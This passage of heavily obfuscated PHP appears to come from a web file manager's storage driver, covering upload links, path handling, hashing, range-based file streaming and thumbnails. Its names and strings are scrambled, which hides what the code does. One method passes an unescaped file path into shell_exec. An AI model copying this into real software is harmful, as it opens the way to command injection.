$C±∆∆”ÿ†â[$F”äŸ∏»ô€[74]]); foreach ($C±∆∆”ÿ†â as $a∆∑‹ËÏäì) { if ($a∆∑‹ËÏäì[$F”äŸ∏»ô€[29]] == $F”äŸ∏»ô€[77]) { $Eç≈ëÁÙ à[$F”äŸ∏»ô€[80]]++; $EÂáºıßûÿ = $this->getPathInner($a∆∑‹ËÏäì[$F”äŸ∏»ô€[76]]); $this->infoChildren($EÂáºıßûÿ, $Eç≈ëÁÙ à); } else { $Eç≈ëÁÙ à[$F”äŸ∏»ô€[79]]++; $Eç≈ëÁÙ à[$F”äŸ∏»ô€[78]] += $a∆∑‹ËÏäì[$F”äŸ∏»ô€[78]]; } } } public function fileSubstr($E”è∆áÈ†˜, $DÎ‰Ùöâ‚, $bÃ≤∂®ƒ È) { } public function listAll($d°Ñú∆øÂ≠) { } public function upload($Dà£ßëËªâ, $f‹Êêííˆ÷, $bÔÁßóŸ∆∫ = false, $FùÑÃœ‡Íé = REPEAT_REPLACE) { } public function uploadFileByID($eÏ∆Ù‚£¥û, $Dãî‘⁄ó´±, $aé¿πàæÈã) { } public function uploadFileByPath($AÈÑ˘ç≈å±, $aıíÇÇÒ™¢, $A’©ÚêÜÜÔ = array()) { } public function isUploadServer() { $aˆ¿ç°ÛìΩ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $aˆ¿ç°ÛìΩ[84]) { return !0; } return $GLOBALS[$aˆ¿ç°ÛìΩ[6]][$aˆ¿ç°ÛìΩ[85]][$aˆ¿ç°ÛìΩ[86]]; } public function isFileOutServer() { $A°πã√¶™· =& $_SERVER[£¿ÌÙëü¡¯¯]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $A°πã√¶™·[84]) { return !0; } return $GLOBALS[$A°πã√¶™·[6]][$A°πã√¶™·[85]][$A°πã√¶™·[87]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($EúÈÂÀãÀ») { $b€ÓÃÀÎŒ∏ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$this->isCdnHost()) { return $EúÈÂÀãÀ»; } return str_replace(trim(get_url_root($EúÈÂÀãÀ»), $b€ÓÃÀÎŒ∏[8]), trim($this->cdnHost, $b€ÓÃÀÎŒ∏[8]), $EúÈÂÀãÀ»); } public function uploadLink($eúÛ≤Î¨ç·, $a¥Êäºﬂ‘¯ = 0) { goto fŒÏπÏáãç; fŒÏπÏáãç: $e†ó´ÇŸºÆ =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($this->isUploadServer()) { return; } $aà‡€“ô©û = $this->getType(); goto a“‰ºÙ‚ÎÖ; a“‰ºÙ‚ÎÖ: if (!in_array($aà‡€“ô©û, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $b‡‘ÛÔî‹ = 1024 * 1024 * 10; goto bº¢ºã£Öî; aƒÒ≤èç∫®: $CçΩ‡à∞é≥ = $this->{$Fß·£™¡Û‡}($eúÛ≤Î¨ç·, $AÒﬂ…Îû£); if ($CçΩ‡à∞é≥) { $CçΩ‡à∞é≥[$e†ó´ÇŸºÆ[90]] = $eúÛ≤Î¨ç·; $CçΩ‡à∞é≥[$e†ó´ÇŸºÆ[91]] = $aà‡€“ô©û; } return $CçΩ‡à∞é≥; goto DÆÜ’¨∆Ωπ; bº¢ºã£Öî: $Fß·£™¡Û‡ = $a¥Êäºﬂ‘¯ <= $b‡‘ÛÔî‹ ? $e†ó´ÇŸºÆ[88] : $e†ó´ÇŸºÆ[89]; if ($aà‡€“ô©û == $e†ó´ÇŸºÆ[61]) { $Fß·£™¡Û‡ = $e†ó´ÇŸºÆ[89]; } $AÒﬂ…Îû£ = (!$a¥Êäºﬂ‘¯ ? 1 : ceil($a¥Êäºﬂ‘¯ / pow(1024, 3))) * 3600 * 4; goto aƒÒ≤èç∫®; DÆÜ’¨∆Ωπ: } public function uploadFormData($a™ıõıƒ€ˆ, $b–ø≤¥Ûÿ° = 3600) { } public function multiUploadFormData($D˘ëíπﬂå≥, $AªÇ≥£¡£¿ = 3600) { } public function osChunkSize() { $Fπèª≥õ”ˆ =& $_SERVER[£¿ÌÙëü¡¯¯]; $A–™˜ÿÊúÇ = (double) $GLOBALS[$Fπèª≥õ”ˆ[6]][$Fπèª≥õ”ˆ[85]][$Fπèª≥õ”ˆ[92]][$Fπèª≥õ”ˆ[93]]; if (!$A–™˜ÿÊúÇ) { $A–™˜ÿÊúÇ = 1024 * 84 * 10; } return $A–™˜ÿÊúÇ; } public function download($d»Ö“°Ô‹ó, $c™ÇÜ—ôúâ) { } public function ext($E≠·À√øÙÎ) { $E∞Ç»Ú≈•∏ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (strpos($E≠·À√øÙÎ, $E∞Ç»Ú≈•∏[8]) === -1) { $bƒã„ê«•ª = $E≠·À√øÙÎ; } else { $bƒã„ê«•ª = $this->pathThis($E≠·À√øÙÎ); } $Fé√ååﬂùÖ = $E∞Ç»Ú≈•∏[33]; if (strstr($bƒã„ê«•ª, $E∞Ç»Ú≈•∏[94])) { $Fé√ååﬂùÖ = substr($bƒã„ê«•ª, strrpos($bƒã„ê«•ª, $E∞Ç»Ú≈•∏[94]) + 1); $Fé√ååﬂùÖ = strtolower($Fé√ååﬂùÖ); } if (strlen($Fé√ååﬂùÖ) > 3 && preg_match($E∞Ç»Ú≈•∏[95], $Fé√ååﬂùÖ, $A√ÑﬁóÑÆé)) { $Fé√ååﬂùÖ = $E∞Ç»Ú≈•∏[33]; } return $Fé√ååﬂùÖ; } public function pathThis($A´—ØôÚïÒ) { $dçåæﬂ∫ıµ =& $_SERVER[£¿ÌÙëü¡¯¯]; $A´—ØôÚïÒ = str_replace($dçåæﬂ∫ıµ[96], $dçåæﬂ∫ıµ[8], rtrim($A´—ØôÚïÒ, $dçåæﬂ∫ıµ[8])); $cüé—™ø…Í = strrpos($A´—ØôÚïÒ, $dçåæﬂ∫ıµ[8]); if ($cüé—™ø…Í === !1) { return $A´—ØôÚïÒ; } return substr($A´—ØôÚïÒ, $cüé—™ø…Í + 1); } public function pathFather($bëΩ⁄˜·ôπ) { $bÍñÌåÒêã =& $_SERVER[£¿ÌÙëü¡¯¯]; $bëΩ⁄˜·ôπ = str_replace($bÍñÌåÒêã[96], $bÍñÌåÒêã[8], rtrim($bëΩ⁄˜·ôπ, $bÍñÌåÒêã[8])); $eßÖá‰Ôèñ = strrpos($bëΩ⁄˜·ôπ, $bÍñÌåÒêã[8]); if ($eßÖá‰Ôèñ === !1) { return $bÍñÌåÒêã[33]; } return substr($bëΩ⁄˜·ôπ, 0, $eßÖá‰Ôèñ + 1); } public function hashSimple($eπ˘‡à€…ß) { goto Dµ™‹˘ú‚∂; b¨à„è¿¯Õ: $b¯âæãåìﬂ .= $this->fileSubstr($eπ˘‡à€…ß, $cÕõ”≤è¥‚ - $EÂ»Ï›üäá, $EÂ»Ï›üäá); return md5($b¯âæãåìﬂ) . $cÕõ”≤è¥‚; goto F„ÓüùàÑª; Dµ™‹˘ú‚∂: $f¡õËêî† =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$eπ˘‡à€…ß) { return md5($f¡õËêî†[33]); } $cÕõ”≤è¥‚ = $this->size($eπ˘‡à€…ß); goto Aµ √ÕΩ¨¶; cîòá∑æà: $A±ÑÑ˜Ü÷ = intval($cÕõ”≤è¥‚ / $B¶œƒ—–≈∑); $b¯âæãåìﬂ = $f¡õËêî†[33]; for ($b”·œ§ó§£ = 0; $b”·œ§ó§£ < $B¶œƒ—–≈∑; $b”·œ§ó§£++) { $b¯âæãåìﬂ .= $this->fileSubstr($eπ˘‡à€…ß, $A±ÑÑ˜Ü÷ * $b”·œ§ó§£, $EÂ»Ï›üäá); } goto b¨à„è¿¯Õ; Aµ √ÕΩ¨¶: $EÂ»Ï›üäá = 200; $B¶œƒ—–≈∑ = 50; if ($cÕõ”≤è¥‚ <= $EÂ»Ï›üäá * $B¶œƒ—–≈∑) { return $this->hashMd5($eπ˘‡à€…ß) . $cÕõ”≤è¥‚; } goto cîòá∑æà; F„ÓüùàÑª: } public static $md5Cache = array(); public function hashMd5($A›¶Óáﬂåé) { $A›¶Óáﬂåé = $this->iconvSystem($A›¶Óáﬂåé); if (isset(self::$md5Cache[$A›¶Óáﬂåé])) { return self::$md5Cache[$A›¶Óáﬂåé]; } self::$md5Cache[$A›¶Óáﬂåé] = $this->hashMd5Shell($A›¶Óáﬂåé); if (!self::$md5Cache[$A›¶Óáﬂåé]) { self::$md5Cache[$A›¶Óáﬂåé] = @md5_file($A›¶Óáﬂåé); } return self::$md5Cache[$A›¶Óáﬂåé]; } private function hashMd5Shell($fÉ€‰’ıÉ¬) { goto Dÿ®ˆ¥ÛÁÿ; dÌñòÙä¶Ø: $F◊æìöÉãÓ = shell_exec($fŸùÜÀ™´≈ . "\40\x22{$fÉ€‰’ıÉ¬}\42"); return substr($F◊æìöÉãÓ, 0, 32); goto A©ıäŒ∞á˘; Dÿ®ˆ¥ÛÁÿ: $fÀ€®Ïôç¶ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!function_exists($fÀ€®Ïôç¶[97])) { return !1; } $bê’·≥Ê≥ê = array($fÀ€®Ïôç¶[98], $fÀ€®Ïôç¶[99]); goto d¯ıÉïƒ¯π; d¯ıÉïƒ¯π: $fŸùÜÀ™´≈ = Cache::get($fÀ€®Ïôç¶[100]); if (!$fŸùÜÀ™´≈) { $Bõ∂ÇøîŒ› = BASIC_PATH . $fÀ€®Ïôç¶[101]; $a≥◊≈Æ∫œÉ = md5_file($Bõ∂ÇøîŒ›); $fŸùÜÀ™´≈ = $fÀ€®Ïôç¶[102]; foreach ($bê’·≥Ê≥ê as $F¶≤£â—ƒ¨) { $F◊æìöÉãÓ = shell_exec($F¶≤£â—ƒ¨ . "\40\x22{$Bõ∂ÇøîŒ›}\x22"); if ($F◊æìöÉãÓ && substr(trim($F◊æìöÉãÓ), 0, 32) == $a≥◊≈Æ∫œÉ) { $fŸùÜÀ™´≈ = $F¶≤£â—ƒ¨; break; } } Cache::set($fÀ€®Ïôç¶[100], $fŸùÜÀ™´≈, 3600); } if ($fŸùÜÀ™´≈ == $fÀ€®Ïôç¶[102]) { return !1; } goto dÌñòÙä¶Ø; A©ıäŒ∞á˘: } public function link($eÓøâ—Ëˆ) { return $eÓøâ—Ëˆ; } public function fileOut($CÇäëëïÆΩ, $d„≤›û”π¡ = false, $B§ºè∞“ü¨ = false, $a∞∏¥™ÀÙƒ = '') { goto B†⁄¥ÉÜ€«; Cæ≈Üá‚ëÑ: if (in_array($E√‚≈ôÜﬂ‚, array($b“ã™±·˘¡[109], $b“ã™±·˘¡[110], $b“ã™±·˘¡[111], $b“ã™±·˘¡[112]))) { $E√‚≈ôÜﬂ‚ = $b“ã™±·˘¡[113]; } if (!$a∞∏¥™ÀÙƒ) { $a∞∏¥™ÀÙƒ = md5($D‡Ω©è™Ñ¿ . $this->hashSimple($CÇäëëïÆΩ)); } $a∞∏¥™ÀÙƒ = $b“ã™±·˘¡[114] . $a∞∏¥™ÀÙƒ . $b“ã™±·˘¡[114]; goto AÕ—áø‚û™; B†⁄¥ÉÜ€«: $b“ã™±·˘¡ =& $_SERVER[£¿ÌÙëü¡¯¯]; $this->cacheMethod(null, null); if (!$CÇäëëïÆΩ || !$this->exist($CÇäëëïÆΩ)) { show_json(LNG($b“ã™±·˘¡[103]), !1, $B§ºè∞“ü¨); } goto A◊ôãÏ§∞ì; d°ÖÙæ˜ã¿: $F’¶åàñîõ = $a˘Ë˜¢ÂÉ[$b“ã™±·˘¡[78]]; $D‡Ω©è™Ñ¿ = gmdate($b“ã™±·˘¡[107], $a˘Ë˜¢ÂÉ[$b“ã™±·˘¡[108]]); $c»πˆ§‹Øú = $B§ºè∞“ü¨ ? $B§ºè∞“ü¨ : $this->iconvApp($a˘Ë˜¢ÂÉ[$b“ã™±·˘¡[28]]); goto CÕ◊¿ú¯ºË; eÕúîñ’√Ì: header($b“ã™±·˘¡[133] . $D‡Ω©è™Ñ¿ . $b“ã™±·˘¡[125]); header($b“ã™±·˘¡[134] . $c»πˆ§‹Øú); header($b“ã™±·˘¡[135]); goto C÷ÁÍçì‘™; d¢ÑæñÓ°ƒ: @ob_end_clean(); set_timeout(); $a˘Ë˜¢ÂÉ = $this->infoFull($CÇäëëïÆΩ); goto d°ÖÙæ˜ã¿; Aÿ¥∞ÀƒÏ§: if (isset($_SERVER[$b“ã™±·˘¡[129]]) && strtotime($_SERVER[$b“ã™±·˘¡[129]]) == $a˘Ë˜¢ÂÉ[$b“ã™±·˘¡[108]]) { header($b“ã™±·˘¡[130], !0, 304); die; } if (isset($_SERVER[$b“ã™±·˘¡[131]]) && $_SERVER[$b“ã™±·˘¡[131]] == $a∞∏¥™ÀÙƒ) { header($b“ã™±·˘¡[132] . $a∞∏¥™ÀÙƒ, !0, 304); die; } header($b“ã™±·˘¡[132] . $a∞∏¥™ÀÙƒ); goto eÕúîñ’√Ì; fÈÓã´ü”Ó: header($b“ã™±·˘¡[122]); header($b“ã™±·˘¡[123] . $F¯ÖØΩØ¢«); header($b“ã™±·˘¡[124] . gmdate($b“ã™±·˘¡[107], time() + 3600 * 24 * 30) . $b“ã™±·˘¡[125]); goto E°ûÀü¨å•; DœÑ£Ω—Öï: if ($_SERVER[$b“ã™±·˘¡[151]] == $b“ã™±·˘¡[152]) { return; } $eàí“â‹°ù = 1024 * 100; $B÷∑¡à¯Î¡ = 0; goto Fê¶Œ≥ÑÕ≠; eè¨ßÑ≤†å: $Cò≠≈¢ëœØ = rawurlencode($c»πˆ§‹Øú); $Cò≠≈¢ëœØ = $b“ã™±·˘¡[114] . $Cò≠≈¢ëœØ . $b“ã™±·˘¡[118] . $Cò≠≈¢ëœØ; if ($d„≤›û”π¡) { header($b“ã™±·˘¡[119]); header($b“ã™±·˘¡[120] . $Cò≠≈¢ëœØ); } else { header($b“ã™±·˘¡[121] . $Cò≠≈¢ëœØ); } goto fÈÓã´ü”Ó; C÷ÁÍçì‘™: header($b“ã™±·˘¡[136] . $F’¶åàñîõ); header($b“ã™±·˘¡[137]); $cù∂õàº¶‡ = strtolower($_SERVER[$b“ã™±·˘¡[138]]); goto A¥äÕÓëûå; Fê¶Œ≥ÑÕ≠: if ($E√·˜µüóä) { $B÷∑¡à¯Î¡ = intval(1000 * 1000 * ($eàí“â‹°ù / $E√·˜µüóä)); } while ($aÏª∫Ÿ¢™ü <= $B◊‹≠§’ÔÂ) { $eÚÓò˜€Ÿ‡ = timeFloat(); check_abort(); $b¥ÖÀá≥à = $B◊‹≠§’ÔÂ - $aÏª∫Ÿ¢™ü + 1; if ($b¥ÖÀá≥à <= $eàí“â‹°ù) { $eàí“â‹°ù = $b¥ÖÀá≥à; } echo $this->fileSubstr($CÇäëëïÆΩ, $aÏª∫Ÿ¢™ü, $eàí“â‹°ù); $aÏª∫Ÿ¢™ü += $eàí“â‹°ù; if ($eàí“â‹°ù == $b¥ÖÀá≥à) { $aÏª∫Ÿ¢™ü = $B◊‹≠§’ÔÂ + 1; } if ($B÷∑¡à¯Î¡) { $aäƒÏ±†≤ª = intval(1000 * 1000 * (timeFloat() - $eÚÓò˜€Ÿ‡)); $B∑™ÎÀÕåÇ = $B÷∑¡à¯Î¡ - $aäƒÏ±†≤ª; if ($B∑™ÎÀÕåÇ > 5) { usleep($B∑™ÎÀÕåÇ); } } } goto E≥ÿñπ®¡≤; CÕ◊¿ú¯ºË: $aÏª∫Ÿ¢™ü = 0; $B◊‹≠§’ÔÂ = $F’¶åàñîõ - 1; $E√‚≈ôÜﬂ‚ = $this->ext($c»πˆ§‹Øú); goto Cæ≈Üá‚ëÑ; E°ûÀü¨å•: header($b“ã™±·˘¡[126]); header($b“ã™±·˘¡[127]); header($b“ã™±·˘¡[128]); goto Aÿ¥∞ÀƒÏ§; A◊ôãÏ§∞ì: $CÂ¯èéΩŒ = $this->getType() == $b“ã™±·˘¡[104]; $b˘¢Á˘ªàû = $GLOBALS[$b“ã™±·˘¡[6]][$b“ã™±·˘¡[85]][$b“ã™±·˘¡[92]][$b“ã™±·˘¡[105]]; $E√·˜µüóä = (double) $GLOBALS[$b“ã™±·˘¡[6]][$b“ã™±·˘¡[85]][$b“ã™±·˘¡[92]][$b“ã™±·˘¡[106]] * 1024 * 1024; goto d¢ÑæñÓ°ƒ; AÕ—áø‚û™: $F¯ÖØΩØ¢« = get_file_mime($E√‚≈ôÜﬂ‚); if (strstr($F¯ÖØΩØ¢«, $b“ã™±·˘¡[115])) { $F¯ÖØΩØ¢« = $F¯ÖØΩØ¢« . $b“ã™±·˘¡[116]; } if ($d„≤›û”π¡ === !1 && !mime_support($F¯ÖØΩØ¢«)) { $d„≤›û”π¡ = !0; $F¯ÖØΩØ¢« = $b“ã™±·˘¡[117]; } goto eè¨ßÑ≤†å; A¥äÕÓëûå: if ($CÂ¯èéΩŒ && $cù∂õàº¶‡ && $b˘¢Á˘ªàû) { if (strstr($cù∂õàº¶‡, $b“ã™±·˘¡[139])) { header($b“ã™±·˘¡[140] . $CÇäëëïÆΩ); } else { if (strstr($cù∂õàº¶‡, $b“ã™±·˘¡[141])) { header($b“ã™±·˘¡[142] . $CÇäëëïÆΩ); } else { if (strstr($cù∂õàº¶‡, $b“ã™±·˘¡[143])) { header($b“ã™±·˘¡[144] . $CÇäëëïÆΩ); } } } if ($E√·˜µüóä) { header($b“ã™±·˘¡[145] . $E√·˜µüóä); } return; } if (isset($_SERVER[$b“ã™±·˘¡[146]])) { if (preg_match($b“ã™±·˘¡[147], $_SERVER[$b“ã™±·˘¡[146]], $bˆƒÒ∆ΩÇÂ)) { $aÏª∫Ÿ¢™ü = intval($bˆƒÒ∆ΩÇÂ[1]); if (!empty($bˆƒÒ∆ΩÇÂ[2])) { $B◊‹≠§’ÔÂ = intval($bˆƒÒ∆ΩÇÂ[2]); } } header($b“ã™±·˘¡[148]); header("\x43\x6f\156\x74\x65\156\x74\55\x52\x61\x6e\147\x65\72\x20\x62\x79\x74\x65\163\x20{$aÏª∫Ÿ¢™ü}\x2d{$B◊‹≠§’ÔÂ}\57" . $F’¶åàñîõ); } else { header($b“ã™±·˘¡[149]); } header($b“ã™±·˘¡[150] . ($B◊‹≠§’ÔÂ - $aÏª∫Ÿ¢™ü + 1)); goto DœÑ£Ω—Öï; E≥ÿñπ®¡≤: } public function fileOutServer($b∆§Âãø’ê, $DÀ‰ﬁ€”âå = false, $d Çìñ÷“à = false, $Cíüî›áÙ≤ = '') { $this->fileOut($b∆§Âãø’ê, $DÀ‰ﬁ€”âå, $d Çìñ÷“à, $Cíüî›áÙ≤); } public function fileOutLink($f˜ñ≈´ÃÊÛ) { header($_SERVER[£¿ÌÙëü¡¯¯][153] . $f˜ñ≈´ÃÊÛ); die; } public function cacheMethod($cãªëÒÀãÿ, $Câƒﬂ©ôÉÊ) { goto cΩÓ§≈”≤ø; cΩÓ§≈”≤ø: $døÛˆÒÈî⁄ =& $_SERVER[£¿ÌÙëü¡¯¯]; static $bØ«æÛ£–‰ = array(); $DÇ¥üÒŒÎ– = $døÛˆÒÈî⁄[154] . $cãªëÒÀãÿ . $døÛˆÒÈî⁄[155] . rtrim($Câƒﬂ©ôÉÊ, $døÛˆÒÈî⁄[8]); goto Eª‚ºÓé¬ã; EÙääÉŸ©: if (!is_null($f≤”ÖÍÆº¢)) { return $f≤”ÖÍÆº¢; } $f≤”ÖÍÆº¢ = $this->{$cãªëÒÀãÿ}($Câƒﬂ©ôÉÊ); $bØ«æÛ£–‰[$DÇ¥üÒŒÎ–] = $f≤”ÖÍÆº¢; goto bùÃäÜÜÛÕ; Eª‚ºÓé¬ã: if (is_null($cãªëÒÀãÿ)) { $bØ«æÛ£–‰ = array(); return; } if (is_null($Câƒﬂ©ôÉÊ)) { unset($bØ«æÛ£–‰[$DÇ¥üÒŒÎ–]); return; } $f≤”ÖÍÆº¢ = isset($bØ«æÛ£–‰[$DÇ¥üÒŒÎ–]) ? $bØ«æÛ£–‰[$DÇ¥üÒŒÎ–] : null; goto EÙääÉŸ©; bùÃäÜÜÛÕ: return $f≤”ÖÍÆº¢; goto Dæª∞øû•Ù; Dæª∞øû•Ù: } public function fileOutImage($cÖ‚ÙëÁ“—, $CøœàÈ—Óí = 250) { goto fÉ»¶ä‘õ„; F˜ÂáãöºΩ: if ($EÈ§ô´∞÷Ê[$FêóË÷ºé∑[78]] <= 1024 * 50 || !function_exists($FêóË÷ºé∑[156]) || $EÈ§ô´∞÷Ê[$FêóË÷ºé∑[157]] == $FêóË÷ºé∑[158]) { return $this->fileOut($cÖ‚ÙëÁ“—); } if (isset($EÈ§ô´∞÷Ê[$FêóË÷ºé∑[159]][$FêóË÷ºé∑[160]])) { $BùË¶äÍ€¥ = $EÈ§ô´∞÷Ê[$FêóË÷ºé∑[159]][$FêóË÷ºé∑[160]]; } else { if (isset($EÈ§ô´∞÷Ê[$FêóË÷ºé∑[159]][$FêóË÷ºé∑[161]])) { $BùË¶äÍ€¥ = $EÈ§ô´∞÷Ê[$FêóË÷ºé∑[159]][$FêóË÷ºé∑[161]]; } else { $BùË¶äÍ€¥ = md5("{$EÈ§ô´∞÷Ê[$FêóË÷ºé∑[28]]}\137{$EÈ§ô´∞÷Ê[$FêóË÷ºé∑[76]]}\137{$EÈ§ô´∞÷Ê[$FêóË÷ºé∑[78]]}"); } } $C•√∆Øòß‘ = "{$BùË¶äÍ€¥}\x5f{$CøœàÈ—Óí}\56\x70\x6e\x67"; goto A£•ãÈô˜ç; fÉ»¶ä‘õ„: $FêóË÷ºé∑ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (substr($cÖ‚ÙëÁ“—, 0, 4) == $FêóË÷ºé∑[143]) { $this->fileOutLink($cÖ‚ÙëÁ“—); } $EÈ§ô´∞÷Ê = $this->info($cÖ‚ÙëÁ“—); goto F˜ÂáãöºΩ; A£•ãÈô˜ç: if (!($d˘º»’∞®Û = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $FêóË÷ºé∑[162]))) { $fæ∏ÏêÔ®é = IO::mkdir(IO_PATH_SYSTEM_TEMP . $FêóË÷ºé∑[163]); } else { $fæ∏ÏêÔ®é = KodIO::make($d˘º»’∞®Û); } if ($d˘º»’∞®Û = IO::fileNameExist($fæ∏ÏêÔ®é, $C•√∆Øòß‘)) { $CòÕóÚÖ—« = KodIO::make($d˘º»’∞®Û); return IO::fileOut($CòÕóÚÖ—«); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto aßÃ˘êÜ±Ÿ; aßÃ˘êÜ±Ÿ: $CòÕóÚÖ—« = DATA_THUMB . $C•√∆Øòß‘; if (!@file_exists($CòÕóÚÖ—«)) { $E´‡éΩÏ≤∆ = TEMP_FILES; if (!is_dir($E´‡éΩÏ≤∆)) { mk_dir($E´‡éΩÏ≤∆); } $DßÃë”Ø‹ò = $E´‡éΩÏ≤∆ . $BùË¶äÍ€¥ . $FêóË÷ºé∑[94] . $EÈ§ô´∞÷Ê[$FêóË÷ºé∑[157]]; if (!@file_exists($DßÃë”Ø‹ò)) { $DßÃë”Ø‹ò = $this->download($cÖ‚ÙëÁ“—, $DßÃë”Ø‹ò); } $b≈†¶µ«åë = new ImageThumb($DßÃë”Ø‹ò, $FêóË÷ºé∑[164]); $b≈†¶µ«åë->prorate($CòÕóÚÖ—«, $CøœàÈ—Óí, $CøœàÈ—Óí); } if (!file_exists($CòÕóÚÖ—«) || filesize($CòÕóÚÖ—«) < 100) { return @file_exists($DßÃë”Ø‹ò) ? IO::fileOut($DßÃë”Ø‹ò) : $this->fileOut($cÖ‚ÙëÁ“—); } goto D∏ﬂª÷Àèﬁ; D∏ﬂª÷Àèﬁ: if (!($d„†´ÆïÒ∆ = IO::move($CòÕóÚÖ—«, $fæ∏ÏêÔ®é))) { return IO::fileOut($CòÕóÚÖ—«); } del_file($CòÕóÚÖ—«); IO::fileOut($d„†´ÆïÒ∆); goto e–⁄†ﬂÑ ü; e–⁄†ﬂÑ ü: } public function fileOutImageServer($E•´…è≠ÑØ, $fÕ£‹Øà„Ú = 250) { $this->fileOutImage($E•´…è≠ÑØ, $fÕ£‹Øà„Ú); } public function fileNameAuto($E‹ÕËﬂ“óÖ, $b√§≠¬©©°, $aç‘◊çÈç = REPEAT_RENAME, $B•Ûêá°ú∑ = false) { goto D°—°‘ïó®; D°—°‘ïó®: $Bﬂ–£⁄º‚‹ =& $_SERVER[£¿ÌÙëü¡¯¯]; $e∂ÔÂª™¬— = $E‹ÕËﬂ“óÖ === $Bﬂ–£⁄º‚‹[33] ? $b√§≠¬©©° : rtrim($E‹ÕËﬂ“óÖ, $Bﬂ–£⁄º‚‹[8]) . $Bﬂ–£⁄º‚‹[8] . $b√§≠¬©©°; if ($aç‘◊çÈç == REPEAT_REPLACE || !$this->exist($e∂ÔÂª™¬—) || $B•Ûêá°ú∑ && $aç‘◊çÈç != REPEAT_RENAME_FOLDER) { return $b√§≠¬©©°; } goto Fâ€∏∆⁄Ö®; e¿Öò≥´‹è: while ($this->exist(rtrim($E‹ÕËﬂ“óÖ, $Bﬂ–£⁄º‚‹[8]) . $Bﬂ–£⁄º‚‹[8] . $C‰àäœ‹‰î)) { $C‰àäœ‹‰î = $BÔ§ãºﬂ‚À . "\50{$C†µ®¿íû‚}\x29{$f§·‘à©ªÈ}"; $C†µ®¿íû‚++; } return $C‰àäœ‹‰î; goto E¢ãƒ®≠∑Û; c´∆÷ÉﬁŒæ: $C†µ®¿íû‚ = 1; $BÔ§ãºﬂ‚À = substr($b√§≠¬©©°, 0, strlen($b√§≠¬©©°) - strlen($f§·‘à©ªÈ)); $C‰àäœ‹‰î = $BÔ§ãºﬂ‚À . "\x28{$C†µ®¿íû‚}\x29{$f§·‘à©ªÈ}"; goto e¿Öò≥´‹è; Fâ€∏∆⁄Ö®: if ($aç‘◊çÈç == REPEAT_SKIP) { return !1; } $f§·‘à©ªÈ = $Bﬂ–£⁄º‚‹[94] . get_path_ext($b√§≠¬©©°); $f§·‘à©ªÈ = $f§·‘à©ªÈ == $Bﬂ–£⁄º‚‹[94] || $B•Ûêá°ú∑ ? $Bﬂ–£⁄º‚‹[33] : $f§·‘à©ªÈ; goto c´∆÷ÉﬁŒæ; E¢ãƒ®≠∑Û: } public function listAllFiles($e»©·ë€îö, $b◊‹¯ƒÂå∏, $E–´≈·Ø†¿ = array()) { goto aìêÏœÇáˆ; E±¯øπî¢∑: foreach (array_unique($Cá›´‡∂ù“) as $AÏÔıå™†å) { $C≤õä‡Çº– = array($D≈πáÏÑÙú[76] => $this->getPathOuter($D≈πáÏÑÙú[8] . $e»©·ë€îö . $D≈πáÏÑÙú[8] . $AÏÔıå™†å), $D≈πáÏÑÙú[77] => 1, $D≈πáÏÑÙú[78] => 0); if (substr($AÏÔıå™†å, -1) != $D≈πáÏÑÙú[8]) { $C≤õä‡Çº–[$D≈πáÏÑÙú[77]] = 0; $b–«öÆ©Ñê = $this->getPath($e»©·ë€îö . $D≈πáÏÑÙú[8] . $AÏÔıå™†å); $C≤õä‡Çº–[$D≈πáÏÑÙú[78]] = isset($E–´≈·Ø†¿[$b–«öÆ©Ñê]) ? $E–´≈·Ø†¿[$b–«öÆ©Ñê] : $this->size($b–«öÆ©Ñê); } $eñ à¿Ÿ∫∏[] = $C≤õä‡Çº–; } return $eñ à¿Ÿ∫∏; goto DıÈæÏÁƒ¬; Eƒ ÜìÌ”¨: $e»©·ë€îö = trim($e»©·ë€îö, $D≈πáÏÑÙú[8]); foreach ($b◊‹¯ƒÂå∏ as $AÏÔıå™†å) { $EÛ›ñˆÿÕ’ = ltrim(substr($AÏÔıå™†å, strlen($e»©·ë€îö)), $D≈πáÏÑÙú[8]); $Cá›´‡∂ù“ = array_merge($Cá›´‡∂ù“, $this->slicePath($EÛ›ñˆÿÕ’)); } $eñ à¿Ÿ∫∏ = array(); goto E±¯øπî¢∑; aìêÏœÇáˆ: $D≈πáÏÑÙú =& $_SERVER[£¿ÌÙëü¡¯¯]; if (empty($b◊‹¯ƒÂå∏)) { return array(); } $Cá›´‡∂ù“ = array(); goto Eƒ ÜìÌ”¨; DıÈæÏÁƒ¬: } public function slicePath($cüÿ¬ÌáŒ∑) { $C£Ω°èŒ¿å =& $_SERVER[£¿ÌÙëü¡¯¯]; $bÒÌæïáãÏ = explode($C£Ω°èŒ¿å[8], trim($cüÿ¬ÌáŒ∑, $C£Ω°èŒ¿å[8])); $CÈë±¿†∆Ü = 0; do { ++$CÈë±¿†∆Ü; $cà⁄Ó‘…ª…[] = implode($C£Ω°èŒ¿å[8], array_slice($bÒÌæïáãÏ, 0, $CÈë±¿†∆Ü)) . $C£Ω°èŒ¿å[8]; } while ($CÈë±¿†∆Ü < count($bÒÌæïáãÏ)); $cà⁄Ó‘…ª…[count($bÒÌæïáãÏ) - 1] = $cüÿ¬ÌáŒ∑; return $cà⁄Ó‘…ª…; } public function getHost() { $A‚´ƒŒìëº =& $_SERVER[£¿ÌÙëü¡¯¯]; $f …ñ¿ÉÜ€ = parse_url(trim($this->domain, $A‚´ƒŒìëº[8])); $A¢œΩ˘É¨¬ = isset($f …ñ¿ÉÜ€[$A‚´ƒŒìëº[165]]) ? $f …ñ¿ÉÜ€[$A‚´ƒŒìëº[165]] : http_type(); $EÑ™âÏÑÌÑ = isset($f …ñ¿ÉÜ€[$A‚´ƒŒìëº[166]]) ? $f …ñ¿ÉÜ€[$A‚´ƒŒìëº[166]] : $f …ñ¿ÉÜ€[$A‚´ƒŒìëº[76]]; if (isset($f …ñ¿ÉÜ€[$A‚´ƒŒìëº[167]])) { 